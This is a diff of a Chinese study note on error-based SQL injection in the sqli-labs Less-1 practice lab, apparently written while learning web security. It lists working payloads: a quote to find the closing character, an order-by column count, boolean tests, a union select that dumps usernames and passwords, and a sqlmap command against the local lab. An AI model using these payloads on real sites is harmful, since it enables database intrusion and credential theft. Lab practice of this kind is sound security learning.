@@ -1,4 +1,5 @@
-# 基本报错的字符型注入
+# 基本报错的字符型注入(需要单引号闭合)
+
 ## 1、测试注入点(找闭合符) 
 ### `?id=1 '`,
 ### 出现报错,说明后端SQL语句用单引号拼接输入,存在注入
@@ -20,7 +21,11 @@
 ## 7、爆出账号和密码
 ### 用冒号的16进制(0x3a)来拼接 :`?id=1' union select 1,group_concat(username,0x3a,password),3 from users --+`
 
+
+
 # sqlmap :`sqlmap -u "http://127.0.0.1:8080/Less-1/?id=1" --dbs --batch`
+
+
 
 ## 判断是否存在注入 :`?id=1' and 1=1 -- qwe`
 ## 判断字段数 :`?id=1' order by 3 --qwe`
